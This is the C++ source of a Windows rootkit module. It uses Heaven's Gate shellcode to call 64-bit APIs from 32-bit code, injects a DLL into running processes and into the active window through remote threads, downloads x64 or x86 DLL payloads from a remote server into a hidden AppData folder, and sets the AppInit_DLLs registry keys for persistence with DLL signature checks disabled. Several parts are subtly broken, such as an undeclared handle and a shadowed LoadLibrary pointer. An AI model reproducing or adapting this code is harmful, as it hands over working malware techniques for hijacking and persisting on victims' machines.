#pragma once
#ifndef NO_ROOTKIT
#ifndef __RKIT_LOADED
#define __RKIT_LOADED
#include <Windows.h>
#define _WIN32_DCOM
#include <iostream>
using namespace std;
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib") //WMI
#include <atlbase.h>
#include <atlstr.h>
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#pragma comment(lib, "ntdll.lib") //for RtlAdjustPrivilege in heavens gate 
#define SE_DEBUG_PRIVILEGE 20
extern "C" NTSYSAPI NTSTATUS WINAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
char* dllhide = "$6829";
char* mutexseparator = ":";
bool IsInjected(DWORD pid)
{
    CHAR Mutant[64];
    sprintf(Mutant, "%d%s%s", pid, mutexseparator, dllhide);
    HANDLE hMu = OpenMutexA(MAXIMUM_ALLOWED, 0, Mutant);
    if (!hMu)
        return 0;
    CloseHandle(hMu);

    return 1;
}

#define uint64_t unsigned long long int
#define uint32_t unsigned
#define uint16_t unsigned short
#define uint8_t unsigned char

void memcpy64(uint64_t dst, uint64_t src, uint64_t sz) {
	char inst[] = {
		/*32bit:
		push 0x33
		push _next_64bit_block
		retf*/
		0x6A, 0x33, 0x68, 0x44, 0x33, 0x22, 0x11, 0xCB,
		/*64bit:
		push rsi
		push rdi
		mov rsi,src
		mov rdi,dst
		mov rcx,sz
		rep movsb
		pop rdi
		pop rsi
		push 0x23
		push _next_32bit_block
		retfq*/
		0x56, 0x57, 0x48, 0xBE, 0x88, 0x77, 0x66, 0x55,
		0x44, 0x33, 0x22, 0x11, 0x48, 0xBF, 0x88, 0x77,
		0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0xB9,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,
		0xF3, 0xA4, 0x5F, 0x5E, 0x6A, 0x23, 0x68, 0x44,
		0x33, 0x22, 0x11, 0x48, 0xCB,
		/*32bit:
		ret*/
		0xC3
	};
	static char* r = NULL;
	if (!r) {
		r = (char*)VirtualAlloc(0, sizeof(inst), 0x3000, 0x40);
		for (int i = 0; i < sizeof(inst); i++)r[i] = inst[i];
	}

	*(uint32_t*)(r + 3) = (uint32_t)(r + 8);
	*(uint64_t*)(r + 12) = (uint64_t)(src);
	*(uint64_t*)(r + 22) = (uint64_t)(dst);
	*(uint64_t*)(r + 32) = (uint64_t)(sz);
	*(uint32_t*)(r + 47) = (uint32_t)(r + 53);

	((void(*)(void))(r))();
}

void GetPEB64(void* peb) {
	char inst[] = {
		/*32bit:
		mov esi,peb
		push 0x33
		push _next_64bit_block
		retf*/
		0xBE, 0x44, 0x33, 0x22, 0x11, 0x6A, 0x33, 0x68,
		0x44, 0x33, 0x22, 0x11, 0xCB,
		/*64bit:
		mov rax,GS:[0x60]
		mov [esi],rax
		push 0x23
		push _next_32bit_block
		retfq*/
		0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00,
		0x00, 0x67, 0x48, 0x89, 0x06, 0x6A, 0x23, 0x68,
		0x44, 0x33, 0x22, 0x11, 0x48, 0xCB,
		/*32bit:
		ret*/
		0xC3
	};

	static char* r = NULL;
	if (!r) {
		r = (char*)VirtualAlloc(0, sizeof(inst), 0x3000, 0x40);
		memcpy64((uint64_t)(unsigned)r, (uint64_t)(unsigned)inst, sizeof(inst));
	}

	*(uint32_t*)(r + 1) = (uint32_t)(peb);
	*(uint32_t*)(r + 8) = (uint32_t)(r + 13);
	*(uint32_t*)(r + 29) = (uint32_t)(r + 35);

	((void(*)(void))(r))();
}

uint64_t GetModuleLDREntry(wchar_t* name) {
	uint64_t ptr;
	GetPEB64(&ptr);
	memcpy64((uint64_t)(unsigned)(&ptr), ptr + 24, 8);//PTR -> PPEB_LDR_DATA LoaderData;

	uint64_t start = ptr + 16;
	memcpy64((uint64_t)(unsigned)(&ptr), ptr + 16, 8);//PTR -> LIST_ENTRY64 InLoadOrderModuleList.FirstBlink

	while (start != ptr) {
		uint64_t tmp;
		memcpy64((uint64_t)(unsigned)(&tmp), ptr + 96, 8); //TMP -> UNICODE_STRING Basename -> Buffer

		if (tmp) {
			wchar_t kek[32];
			memcpy64((uint64_t)(unsigned)kek, tmp, 60); //KEK = Basename

			if (!lstrcmpiW(name, kek))return ptr;
		}
		memcpy64((uint64_t)(unsigned)(&ptr), ptr, 8); //PTR -> Flink
	}
	return 0;
}

uint64_t GetModuleHandle64(wchar_t* name) {
	uint64_t ldr = GetModuleLDREntry(name);
	if (!ldr)return 0;

	uint64_t base;
	memcpy64((uint64_t)(unsigned)(&base), ldr + 48, 8);
	return base;
}

uint64_t X64Call(uint64_t proc, unsigned long long n, ...) {
	uint64_t* args = (&n) + 1;
	if (n < 4)n = 4;

	uint8_t stackfix = (n % 2) ? 8 : 0;

	static char inst[] = {
		/*32bit:
		push 0x33
		push _next_64bit_block
		retf*/
		0x6A, 0x33, 0x68, 0x44, 0x33, 0x22, 0x11, 0xCB,
		/*64bit:
		push rsi
		push rbx
		mov rbx,rsp
		and rbx,0xf
		add rbx,stackfix
		sub rsp,rbx
		mov rcx,number of stack args
		mov rsi,last (most right) arg ptr
		cmp rcx,0
		jz skip
		nextarg:
		push qword[rsi]
		sub rsi,8
		loop nextarg
		skip:
		mov r9,[rsi]
		sub rsi,8
		mov r8,[rsi]
		sub rsi,8
		mov rdx,[rsi]
		sub rsi,8
		mov rcx,[rsi]
		sub rsp,32
		mov rax,proc
		call rax
		add rsp,32+(8*stackargs)
		add rsp,rbx
		pop rbx
		mov rsi,&ret
		mov [rsi],rax
		pop rsi
		push 0x23
		push _next_32bit_block
		retfq*/
		0x56, 0x53, 0x48, 0x89, 0xE3, 0x48, 0x83, 0xE3,
		0x0F, 0x48, 0x83, 0xC3, 0x38, 0x48, 0x29, 0xDC,
		0x48, 0xC7, 0xC1, 0x39, 0x00, 0x00, 0x00, 0x48,
		0xC7, 0xC6, 0x44, 0x33, 0x22, 0x11, 0x48, 0x83,
		0xF9, 0x00, 0x74, 0x09, 0xFF, 0x76, 0x00, 0x48,
		0x83, 0xEE, 0x08, 0xE2, 0xF7, 0x4C, 0x8B, 0x0E,
		0x48, 0x83, 0xEE, 0x08, 0x4C, 0x8B, 0x06, 0x48,
		0x83, 0xEE, 0x08, 0x48, 0x8B, 0x16, 0x48, 0x83,
		0xEE, 0x08, 0x48, 0x8B, 0x0E, 0x48, 0x83, 0xEC,
		0x20, 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44,
		0x33, 0x22, 0x11, 0xFF, 0xD0, 0x48, 0x83, 0xC4,
		0x69, 0x48, 0x01, 0xDC, 0x5B, 0x48, 0xC7, 0xC6,
		0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x06, 0x5E,
		0x6A, 0x23, 0x68, 0x44, 0x33, 0x22, 0x11, 0x48,
		0xCB,
		/*32bit:
		ret*/
		0xC3
	};

	static char* r = NULL;
	if (!r) {
		r = (char*)VirtualAlloc(0, sizeof(inst), 0x3000, 0x40);
		memcpy64((uint64_t)(unsigned)r, (uint64_t)(unsigned)inst, sizeof(inst));
	}
	uint64_t ret;

	*(uint32_t*)(r + 3) = (uint32_t)(r + 8);
	*(uint8_t*)(r + 20) = stackfix;
	*(uint8_t*)(r + 27) = (uint8_t)(((n > 4) ? (n - 4) : 0));
	*(uint32_t*)(r + 34) = (uint32_t)(&args[n - 1]);
	*(uint64_t*)(r + 83) = proc;
	*(uint8_t*)(r + 96) = (uint8_t)(32 + ((n > 4) ? ((n - 4) * 8) : 0));
	*(uint32_t*)(r + 104) = (uint32_t)(&ret);
	*(uint32_t*)(r + 115) = (uint32_t)(r + 121);

	((void(*)(void))(r))();

	return ret;
}

uint64_t MyGetProcAddress(uint64_t module, char* func) {
	IMAGE_DOS_HEADER dos;
	memcpy64((uint64_t)(unsigned)(&dos), module, sizeof(dos));

	IMAGE_NT_HEADERS64 nt;
	memcpy64((uint64_t)(unsigned)(&nt), module + dos.e_lfanew, sizeof(nt));

	IMAGE_EXPORT_DIRECTORY exp;
	memcpy64((uint64_t)(unsigned)(&exp), module + nt.OptionalHeader.DataDirectory[0].VirtualAddress, sizeof(exp));

	for (DWORD i = 0; i < exp.NumberOfNames; i++) {
		DWORD nameptr;
		memcpy64((uint64_t)(unsigned)(&nameptr), module + exp.AddressOfNames + (4 * i), 4);
		char name[64];
		memcpy64((uint64_t)(unsigned)name, module + nameptr, 64);
		if (!lstrcmpA(name, func)) {
			WORD ord;
			memcpy64((uint64_t)(unsigned)(&ord), module + exp.AddressOfNameOrdinals + (2 * i), 2);
			uint32_t adr;
			memcpy64((uint64_t)(unsigned)(&adr), module + exp.AddressOfFunctions + (4 * ord), 4);
			return module + adr;
		}
	}
	return 0;
}

void MakeUTFStr(char* str, char* out) {
	uint32_t len = lstrlenA(str);

	*(uint16_t*)(out) = (uint16_t)(len * 2); //Length
	*(uint16_t*)(out + 2) = (uint16_t)((len + 1) * 2); //Max Length

	WORD* outstr = (WORD*)(out + 16);
	for (uint32_t i = 0; i <= len; i++)outstr[i] = str[i];
	*(uint64_t*)(out + 8) = (uint64_t)(unsigned)(out + 16);
}

uint64_t GetKernel32() {
	static uint64_t kernel32 = 0;
	if (kernel32)return kernel32;

	uint64_t ntdll = GetModuleHandle64(L"ntdll.dll");
	uint64_t LdrLoadDll = MyGetProcAddress(ntdll, "LdrLoadDll");

	char str[64];
	MakeUTFStr("kernel32.dll", str);
	X64Call(LdrLoadDll, 4, (uint64_t)0, (uint64_t)0, (uint64_t)(unsigned)str, (uint64_t)(unsigned)(&kernel32));

	if (!kernel32) {
		//Windows 7 stuff - based on http://rce.co/knockin-on-heavens-gate-dynamic-processor-mode-switching/
		uint64_t LdrGetKnownDllSectionHandle = MyGetProcAddress(ntdll, "LdrGetKnownDllSectionHandle");
		uint64_t NtMapViewOfSection = MyGetProcAddress(ntdll, "NtMapViewOfSection");
		uint64_t NtUnmapViewOfSection = MyGetProcAddress(ntdll, "NtUnmapViewOfSection");
		uint64_t NtFreeVirtualMemory = MyGetProcAddress(ntdll, "NtFreeVirtualMemory");
		wchar_t* dlls[] = { L"kernelbase.dll", L"kernel32.dll", L"user32.dll" };

		for (int i = 1; i < 3; i++) {
			uint64_t section = 0;
			uint64_t base = 0;
			uint64_t size = 0;
			X64Call(LdrGetKnownDllSectionHandle, 3, (uint64_t)(unsigned)(dlls[i]), (uint64_t)0, (uint64_t)(unsigned)(&section));
			X64Call(NtMapViewOfSection, 10, section,
				(uint64_t)-1, (uint64_t)(unsigned)(&base), (uint64_t)0, (uint64_t)0, (uint64_t)0,
				(uint64_t)(unsigned)(&size), (uint64_t)2, (uint64_t)0, (uint64_t)PAGE_READONLY);

			IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
			IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
			uint64_t imagebase = nt->OptionalHeader.ImageBase;

			uint64_t zero = 0;
			X64Call(NtFreeVirtualMemory, 4, (uint64_t)-1, (uint64_t)(unsigned)(&imagebase), (uint64_t)(unsigned)(&zero), (uint64_t)MEM_RELEASE);
			X64Call(NtUnmapViewOfSection, 2, (uint64_t)-1, (uint64_t)(unsigned)(&base));
		}

		X64Call(LdrLoadDll, 4, (uint64_t)0, (uint64_t)0, str, (uint64_t)(unsigned)(&kernel32));

		for (int i = 0; i < 2; i++) {
			uint64_t base = GetModuleHandle64(dlls[i]);
			IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
			IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);

			uint64_t r = X64Call(base + nt->OptionalHeader.AddressOfEntryPoint, 3, base, (uint64_t)DLL_PROCESS_ATTACH, (uint64_t)0);

			uint64_t ldr = GetModuleLDREntry(dlls[i]);

			uint64_t flags;
			memcpy64((uint64_t)(unsigned)(&flags), ldr + 104, 8);
			flags |= 0x000080000; //LDRP_PROCESS_ATTACH_CALLED
			flags |= 0x000004000; //LDRP_ENTRY_PROCESSED
			memcpy64(ldr + 104, (uint64_t)(unsigned)(&flags), 8);

			WORD loadcount = -1;
			memcpy64(ldr + 112, (uint64_t)(unsigned)(&loadcount), 2);
		}
	}
	return kernel32;
}

uint64_t GetProcAddress64(uint64_t module, uint64_t func) {
	static uint64_t K32GetProcAddress = 0;
	if (!K32GetProcAddress)K32GetProcAddress = MyGetProcAddress(GetKernel32(), "GetProcAddress");

	return X64Call(K32GetProcAddress, 2, module, func);
}

uint64_t LoadLibrary64(char* name) {
	static uint64_t LoadLibraryA = 0;
	if (!LoadLibraryA)LoadLibraryA = GetProcAddress64(GetKernel32(), (uint64_t)(unsigned)"LoadLibraryA");

	return X64Call(LoadLibraryA, 1, (uint64_t)(unsigned)name);
}

#undef uint64_t
#undef uint32_t
#undef uint16_t
#undef uint8_t
class WMITask
{
protected:

    int WMIGetUserProcesses(char *dllpath, DWORD mypid, bool isrunning64);

    //////////////////////////////////////////////////////
    //////////////////WMI Structs/////////////////////////
    CComPtr< IWbemLocator > locator;
    CComPtr< IWbemServices > service;
    CComPtr< IEnumWbemClassObject > enumerator;

    CComPtr< IWbemClassObject > object;

    HRESULT WMIHandle;
    ///////////////////////////////////////////////////////

public:

    //////////////////////////////////////////////////////
    /////////////////WMI Vaiables/////////////////////////

    // WMI Vars : Process
    CString sUserProcesses;

    DWORD mypid;
    ///////////////////////////////////////////////////////

    WMITask(char* dllpath, DWORD mypid, bool isrunning64);

	void WMIConnect(char* dllpath, DWORD mypid, bool isrunning64);



};

// Contructor
//__________________________________________________________________________________
WMITask::WMITask(char *dllpath, DWORD mypid, bool isrunning64)
{
    WMIConnect(dllpath, mypid, isrunning64);
}

// WMI Handler
//_____________________________________________________________________________
void WMITask::WMIConnect(char *dllpath, DWORD mypid, bool isrunning64)
{
    // http://msdn.microsoft.com/en-us/library/aa389273(v=VS.85).aspx

    int result = 0;
    WMIHandle = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // setup process-wide security context
    WMIHandle = CoInitializeSecurity(NULL,	// we're not a server
        -1,			// we're not a server
        NULL,		// we're not a server
        NULL,		// reserved
        RPC_C_AUTHN_LEVEL_DEFAULT, // let DCOM decide
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL);

    // we're going to use CComPtr<>s, whose lifetime must end BEFORE CoUnitialize is called
    // connect to WMI
    WMIHandle = CoCreateInstance(CLSID_WbemAdministrativeLocator, NULL,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, reinterpret_cast<void**>(&locator));

    if (FAILED(WMIHandle))
    {
        // Instantiation of IWbemLocator failed
        
        return;
    }

    // connect to local service with current credentials
    WMIHandle = locator->ConnectServer(L"root\\cimv2", NULL, NULL, NULL,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT,
        NULL, NULL, &service);

    if (SUCCEEDED(WMIHandle))
    {
        WMIGetUserProcesses(dllpath, mypid, isrunning64);

    }
    else {
        // Couldn't connect to service
    }
    CoUninitialize();
}



int WMITask::WMIGetUserProcesses(char * dllpath, DWORD mypid, bool isrunning64)
{

    HRESULT hr = 0;
    IWbemLocator* WbemLocator = NULL;
    IWbemServices* WbemServices = NULL;
    IEnumWbemClassObject* EnumWbem = NULL;

    //initializate the Windows security
    if(CoInitializeEx(0, COINIT_MULTITHREADED) != S_OK)
        return -1;
    if(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL) != S_OK)
        return -1;

    if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&WbemLocator) != S_OK)
        return -1;
    //connect to the WMI
    if(WbemLocator->ConnectServer(L"ROOT\\CIMV2", NULL, NULL, NULL, 0, NULL, NULL, &WbemServices) != S_OK)
        return -1;
    //Run the WQL Query
    if(WbemServices->ExecQuery(L"WQL", L"SELECT ProcessId FROM Win32_Process", WBEM_FLAG_FORWARD_ONLY, NULL, &EnumWbem) != S_OK)
        return -1;

    // Iterate over the enumerator
    if (EnumWbem != nullptr) {
        IWbemClassObject* result = NULL;
        ULONG returnedCount = 0;

        while ((hr = EnumWbem->Next(WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) {
            VARIANT ProcessId;

            // access the properties
            hr = result->Get(L"ProcessId", 0, &ProcessId, 0, 0);
            if (ProcessId.uintVal <= 0 || hr != S_OK) {
                continue;
            }

			if (!IsInjected(ProcessId.uintVal) && ProcessId.uintVal != mypid) {
				HANDLE h = NULL;
				if (isrunning64) {
					uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
					uint64_t OpenProcess64 = GetProcAddress64(kernel32, (uint64_t)"OpenProcess");
					h = (HANDLE)X64Call(OpenProcess64, 3, (uint64_t)PROCESS_ALL_ACCESS, (uint64_t)false, (uint64_t)ProcessId.uintVal);
				}
				else {
					h = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessId.uintVal);
				}
				if (h)
				{
					LPVOID LoadLibAddr = NULL;
					if (isrunning64) {
						uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
						LPVOID LoadLibAddr = (LPVOID)GetProcAddress64(kernel32, (uint64_t)"LoadLibraryA");
					}
					else {
						LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
					}
					LPVOID dereercomp = VirtualAllocEx(h, NULL, strlen(dllpath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

					if (isrunning64) {
						uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
						uint64_t WriteProcessMemory64 = GetProcAddress64(kernel32, (uint64_t)"WriteProcessMemory");
						X64Call(WriteProcessMemory64, 5, (uint64_t)h, (uint64_t)dereercomp, (uint64_t)dllpath, (uint64_t)strlen(dllpath), (uint64_t)NULL);
					}
					else {
						WriteProcessMemory(h, dereercomp, dllpath, strlen(dllpath), NULL);
					}
					HANDLE asdc = NULL;
					if (isrunning64) {
						uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
						uint64_t CreateRemoteThread64 = GetProcAddress64(kernel32, (uint64_t)"CreateRemoteThread");
						X64Call(CreateRemoteThread64, 5, (uint64_t)h, (uint64_t)NULL, (uint64_t)NULL, (uint64_t)(LPTHREAD_START_ROUTINE)LoadLibAddr, (uint64_t)dereercomp, (uint64_t)0, (uint64_t)NULL);
					}
					else {
						HANDLE asdc = CreateRemoteThread(h, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);
					}
					WaitForSingleObject(asdc, INFINITE);
					if (isrunning64) {
						uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
						uint64_t VirtualFreeEx64 = GetProcAddress64(kernel32, (uint64_t)"VirtualFreeEx");
						X64Call(VirtualFreeEx64, 5, (uint64_t)h, (uint64_t)dereercomp, (uint64_t)dllpath, (uint64_t)strlen(dllpath), (uint64_t)MEM_RELEASE);
					}
					else {
						VirtualFreeEx(h, dereercomp, strlen(dllpath), MEM_RELEASE);
					}
					CloseHandle(asdc);
					CloseHandle(h);
				};
			}
        }
    }
    if (EnumWbem != nullptr) 
        EnumWbem->Release();
    
    if (WbemServices != nullptr) 
        WbemServices->Release();
    
    if(WbemLocator!= nullptr)
        WbemLocator->Release();

    CoUninitialize();
    return 0;
}
#pragma comment(lib, "urlmon.lib")

void DownloadFile(char* url, char* dest) {

	HINTERNET hInet;
	hInet = InternetOpenA("Dll Getter", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInet) return;
	HANDLE fh, f;
	
	fh = InternetOpenUrl(ih, url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			return;
		}
		char fbuff[512];
		DWORD r = 0, d = 0;
		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
		} while (r > 0);
		CloseHandle(f);
	}
}
DWORD WINAPI rootkit(LPARAM none) {


	int err = 0;
	WSADATA WSAdata;
	if ((err = WSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0)
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2) {
		WSACleanup();
		return 0;
	}
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;

	HKEY hKey;
	long result = RegOpenKeyExA(
		HKEY_LOCAL_MACHINE,
		(LPCSTR)"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs",
		0,
		KEY_WRITE,
		&hKey
	);
    char dllinstallpath[MAX_PATH + 17];
    char exeinstallpath[MAX_PATH + 17];
    sprintf(dllinstallpath, "%s\\%s\\%s_.dll", std::getenv("APPDATA"), dllhide, dllhide);
    sprintf(exeinstallpath, "%s\\%s\\%s_.exe", std::getenv("APPDATA"), dllhide, dllhide);
	struct stat buffer;
	char url[512];
	bool isrunning64 = false;
    SYSTEM_INFO sysInfo, * lpInfo;
    lpInfo = &sysInfo;
    ::GetSystemInfo(lpInfo);
    switch (lpInfo->wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64:
    case PROCESSOR_ARCHITECTURE_IA64:
		isrunning64 = true;
        sprintf(url, "http://%s/x64.dll", dllserver);
        break;
    case PROCESSOR_ARCHITECTURE_INTEL:
        sprintf(url, "http://%s/x86.dll", dllserver);
        break;
    case PROCESSOR_ARCHITECTURE_UNKNOWN:
    default:
        return 1;
    }
	if (stat(dllinstallpath, &buffer) != 0) {
        DownloadFile(url, dllinstallpath);
        if (stat(dllinstallpath, &buffer) != 0) return 2;
	}

	if (result == ERROR_SUCCESS) {

		DWORD value0 = 0;
		DWORD value1 = 1;
		RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dllinstallpath, (strlen(dllinstallpath) + 1) * sizeof(char));
		RegSetValueExA(hKey, "RequireSignedAppInit_DLLs", 0, REG_DWORD, (BYTE*)value0, sizeof(DWORD));
		RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)value1, sizeof(DWORD));
		RegCloseKey(hKey);
	}
    DWORD mypid = GetCurrentProcessId();
	while (1) {
        DWORD activePID;
        HWND activeWnd = GetActiveWindow();
        GetWindowThreadProcessId(activeWnd, &activePID);

		if (!IsInjected(activePID) && activePID != mypid) {
			HANDLE h = NULL;
			if (isrunning64) {
				uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
				uint64_t OpenProcess64 = GetProcAddress64(kernel32, (uint64_t)"OpenProcess");
				h = (HANDLE)X64Call(OpenProcess64, 3, (uint64_t)PROCESS_ALL_ACCESS, (uint64_t)false, (uint64_t)activePID);
			}
			else {
				h = OpenProcess(PROCESS_ALL_ACCESS, false, activePID);
			}
			if (h)
			{
				LPVOID LoadLibAddr = NULL;
				if (isrunning64) {
					uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
					LPVOID LoadLibAddr = (LPVOID)GetProcAddress64(kernel32, (uint64_t)"LoadLibraryA");
				}
				else {
					LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
				}
				LPVOID dereercomp = VirtualAllocEx(h, NULL, strlen(dllinstallpath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
				
				if (isrunning64) {
					uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
					uint64_t WriteProcessMemory64 = GetProcAddress64(kernel32, (uint64_t)"WriteProcessMemory");
					X64Call(WriteProcessMemory64, 5, (uint64_t)h, (uint64_t)dereercomp, (uint64_t)dllinstallpath, (uint64_t)strlen(dllinstallpath), (uint64_t)NULL);
				}
				else {
					WriteProcessMemory(h, dereercomp, dllinstallpath, strlen(dllinstallpath), NULL);
				}
				HANDLE asdc = NULL;
				if (isrunning64) {
					uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
					uint64_t CreateRemoteThread64 = GetProcAddress64(kernel32, (uint64_t)"CreateRemoteThread");
					X64Call(CreateRemoteThread64, 5, (uint64_t)h, (uint64_t)NULL, (uint64_t)NULL, (uint64_t)(LPTHREAD_START_ROUTINE)LoadLibAddr, (uint64_t)dereercomp, (uint64_t)0, (uint64_t)NULL);
				}
				else {
					HANDLE asdc = CreateRemoteThread(h, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);
				}
				WaitForSingleObject(asdc, INFINITE);
				if (isrunning64) {
					uint64_t kernel32 = GetModuleHandle64(L"kernel32.dll");
					uint64_t VirtualFreeEx64 = GetProcAddress64(kernel32, (uint64_t)"VirtualFreeEx");
					X64Call(VirtualFreeEx64, 5, (uint64_t)h, (uint64_t)dereercomp, (uint64_t)dllinstallpath, (uint64_t)strlen(dllinstallpath), (uint64_t)MEM_RELEASE);
				}
				else {
					VirtualFreeEx(h, dereercomp, strlen(dllinstallpath), MEM_RELEASE);
				}
				CloseHandle(asdc);
				CloseHandle(h);
			};
		}
        //WMITask wmi = WMITask(dllinstallpath, mypid);
        Sleep(100);
	}
}
#endif
#endif
